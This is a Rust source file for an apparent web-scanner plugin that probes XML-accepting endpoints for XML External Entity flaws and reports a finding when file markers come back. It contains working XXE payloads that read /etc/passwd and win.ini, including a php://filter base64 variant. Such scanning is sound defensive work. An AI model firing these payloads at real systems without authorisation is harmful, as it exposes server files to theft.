//! XXE (XML External Entity) detector.
//!
//! Targets endpoints whose response body at crawl time looks like XML
//! (Content-Type or MIME sniffing). For each such page, re-posts a
//! crafted XML document containing a file-reading external entity and
//! scans the response for distinctive system-file markers. This is the
//! in-band variant — no OAST required.
//!
//! Detection is limited to endpoints that *already* accept XML: we don't
//! flip a non-XML endpoint into XML mode (too many false positives from
//! servers that happily 400 any payload). The crawler currently only
//! tracks GET targets, so XXE coverage will broaden as POST discovery
//! lands; for now we issue XXE probes to every crawled URL that was
//! previously reached with a `Content-Type: application/xml`-style
//! response.

use std::sync::Arc;

use async_trait::async_trait;
use tokio::sync::Mutex;

use corvex_core::crawler::{CrawlGraph, CrawledPage};
use corvex_core::error::Result;
use corvex_core::http::request::Request;
use corvex_core::plugin::{HookKind, Plugin, PluginInfo};
use corvex_core::report::{ReportItem, Severity};
use corvex_core::scan::ScanCtx;
use corvex_core::target::Mark;

use crate::active_util::{body_snippet, truncate};

static INFO: PluginInfo = PluginInfo {
    name: "xxe",
    full_name: "XML External Entity",
    description: "Sends crafted XML payloads with external-entity references to XML-accepting endpoints and confirms in-band XXE by detecting distinctive file markers (/etc/passwd, win.ini) in the response body.",
    weight: 64,
    default: false,
    extra: false,
    hooks: &[HookKind::Active],
};

fn xml_payloads() -> Vec<(String, Vec<&'static str>)> {
    // (XML body, list of markers). Multiple markers per payload because
    // different servers normalise path traversal at different layers —
    // we look for *any* of them.
    let posix = r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY corvex SYSTEM "file:///etc/passwd">
]>
<root>&corvex;</root>"#;
    let windows = r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY corvex SYSTEM "file:///c:/windows/win.ini">
]>
<root>&corvex;</root>"#;
    let b64 = r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % ent "<!ENTITY corvex '%file;'>">
%ent;
]>
<root>&corvex;</root>"#;
    vec![
        (posix.to_string(), vec!["root:x:", "daemon:x:"]),
        (windows.to_string(), vec!["[extensions]", "[fonts]"]),
        (b64.to_string(), vec!["cm9vdDp4Og==", "cm9vdDp4OjA6MDpyb290"]),
    ]
}

#[derive(Default)]
pub struct XxePlugin;

fn looks_like_xml(page: &CrawledPage) -> bool {
    // Best-effort: the crawler keeps the URL + query params + forms but
    // not response headers, so this heuristic is intentionally loose.
    // Anything with `.xml` / `.rss` / `.atom` in the path or an obvious
    // XML-ish query parameter gets probed.
    let url_lc = page.url.to_ascii_lowercase();
    url_lc.ends_with(".xml")
        || url_lc.ends_with(".atom")
        || url_lc.ends_with(".rss")
        || url_lc.contains("/xml")
        || url_lc.contains("soap")
        || page.query_params.iter().any(|p| {
            let pl = p.to_ascii_lowercase();
            pl == "xml" || pl == "data" || pl == "payload" || pl == "request"
        })
}

fn finding(uri: &str, payload: &str, marker: &str) -> ReportItem {
    ReportItem {
        corvex_id: String::new(),
        method: "POST".to_string(),
        uri: uri.to_string(),
        message: format!(
            "XML External Entity (XXE): posting {payload_short:?} to this \
             endpoint caused the response to include the marker {marker:?}, \
             confirming an external-entity reference was resolved server-side. \
             An attacker can read arbitrary local files and, depending on the \
             parser, pivot to SSRF.",
            payload_short = truncate(payload, 200)
        ),
        refs: "CWE-611".into(),
        data: String::new(),
        plugin: "xxe".to_string(),
        severity: Severity::Critical,
        ..Default::default()
    }
}

async fn probe_xxe(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    page: &CrawledPage,
) -> Option<ReportItem> {
    let payloads = xml_payloads();
    for (xml, markers) in &payloads {
        if ctx.is_cancelled() {
            return None;
        }
        let (host, port) = {
            let m = mark.lock().await;
            (m.hostname.clone(), m.port)
        };
        let ssl = { mark.lock().await.ssl };
        let path = match url::Url::parse(&page.url) {
            Ok(u) => {
                let mut p = u.path().to_string();
                if let Some(q) = u.query() {
                    p.push('?');
                    p.push_str(q);
                }
                p
            }
            Err(_) => page.url.clone(),
        };
        let mut req = Request::new(&host, port, "POST", &path);
        req.ssl = ssl;
        req.set_header("Content-Type", "application/xml");
        req.body = xml.clone().into_bytes();
        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => continue,
        };
        let snippet = body_snippet(&resp.body, 64 * 1024);
        for m in markers {
            if snippet.contains(m) {
                return Some(finding(&page.url, xml, m));
            }
        }
    }
    None
}

#[async_trait]
impl Plugin for XxePlugin {
    fn info(&self) -> &'static PluginInfo {
        &INFO
    }

    async fn on_active(
        &self,
        ctx: &ScanCtx,
        mark: Arc<Mutex<Mark>>,
        graph: Arc<CrawlGraph>,
    ) -> Result<()> {
        for page in &graph.pages {
            if ctx.is_cancelled() {
                break;
            }
            if !looks_like_xml(page) {
                continue;
            }
            if let Some(item) = probe_xxe(ctx, mark.clone(), page).await {
                ctx.emit(mark.clone(), vec![item]).await;
            }
        }
        Ok(())
    }
}
